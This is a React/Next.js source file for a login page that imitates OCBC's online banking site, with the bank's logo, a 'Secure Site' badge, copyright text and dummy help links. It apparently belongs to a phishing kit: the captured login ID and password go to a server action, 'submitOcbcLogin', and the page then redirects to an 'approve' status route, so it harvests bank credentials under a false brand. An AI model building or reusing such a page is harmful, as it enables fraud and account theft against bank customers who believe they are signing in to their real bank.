"use client";

import React, { useState } from "react";
import Image from "next/image";
import { Lock, Loader2 } from "lucide-react";
import { submitOcbcLogin } from "@/lib/action";
import { useRouter } from "next/navigation";

export default function OcbcLoginPage() {
  const [loginId, setLoginId] = useState("");
  const [password, setPassword] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (loginId.length < 3 || password.length < 6) {
      setError("Please enter valid credentials.");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      const result = await submitOcbcLogin(loginId, password);
      if (result.success) {
        setTimeout(() => {
          router.push("/b/status/approve");
        }, 1500);
      } else {
        setError(result.error || "Login failed. Please try again.");
        setIsLoading(false);
      }
    } catch (err) {
      setError("Something went wrong. Please try again later.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex min-h-screen flex-col bg-white font-sans text-[#333]">
      {/* Header */}
      <header className="px-6 pt-10 pb-12">
        <div className="flex items-center">
          <Image
            src="/bank/Logo-ocbc.svg"
            alt="OCBC Logo"
            width={180}
            height={48}
            className="h-10 w-auto"
          />
        </div>
      </header>

      {/* Main Content */}
      <main className="flex flex-1 flex-col px-10">
        <div className="mb-12 flex items-center gap-2 text-gray-500">
          <div className="flex h-5 w-5 items-center justify-center rounded bg-[#FFD700]/20">
            <Lock size={12} className="text-[#DAA520] fill-[#DAA520]" />
          </div>
          <span className="text-[14px] font-medium tracking-tight opacity-70">Secure Site</span>
        </div>

        <h1 className="mb-14 text-[34px] font-light text-[#444]">
          Online Banking
        </h1>

        <form onSubmit={handleLogin} className="space-y-12">
          {error && (
            <div className="rounded bg-red-50 p-3 text-center text-sm font-medium text-red-600 border border-red-100 animate-in fade-in slide-in-from-top-1">
              {error}
            </div>
          )}

          {/* Login ID Section */}
          <div className="group relative">
            <label className={`absolute left-0 transition-all duration-200 pointer-events-none ${loginId ? '-top-6 text-[13px] text-gray-400' : 'top-0 text-[17px] text-gray-500'}`}>
              Login ID
            </label>
            <input
              type="text"
              value={loginId}
              onChange={(e) => setLoginId(e.target.value)}
              className="w-full border-b border-gray-300 py-2 text-[18px] outline-none transition-all focus:border-[#ED1C24]"
              required
            />
          </div>

          {/* Password Section */}
          <div className="group relative">
            <label className={`absolute left-0 transition-all duration-200 pointer-events-none ${password ? '-top-6 text-[13px] text-gray-400' : 'top-0 text-[17px] text-gray-500'}`}>
              Password
            </label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full border-b border-gray-300 py-2 text-[18px] outline-none transition-all focus:border-[#ED1C24]"
              required
            />
          </div>

          <div className="flex items-center justify-between pt-4">
            <button
              type="button"
              className="text-[15px] font-medium text-[#006496] hover:underline"
            >
              Forgot Login ID/Password?
            </button>
            
            <button
              type="submit"
              disabled={isLoading}
              className="min-w-[140px] rounded-lg bg-[#ED1C24] py-3.5 text-xl font-bold text-white shadow-lg transition-all active:scale-[0.98] disabled:opacity-80 flex items-center justify-center gap-2"
            >
              {isLoading ? (
                <Loader2 className="h-6 w-6 animate-spin" />
              ) : (
                "Login"
              )}
            </button>
          </div>
        </form>

        {/* Action Links */}
        <div className="mt-16 flex items-center justify-between border-t border-gray-100 pt-8">
          <button className="text-[15px] font-bold text-[#006496] underline underline-offset-4">
            Need Help?
          </button>
          <div className="text-[15px] font-medium text-gray-600">
            First time user? <button className="font-bold text-[#006496] underline underline-offset-4">Activate now</button>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="px-6 py-12 text-center">
        <div className="flex flex-wrap justify-center gap-x-3 gap-y-2 text-[11px] font-medium text-gray-500">
          <span>© OCBC. All Rights Reserved.</span>
          <button className="hover:underline">Conditions of Access</button>
          <span className="text-gray-300">|</span>
          <button className="hover:underline">Security & Privacy</button>
        </div>
      </footer>
    </div>
  );
}
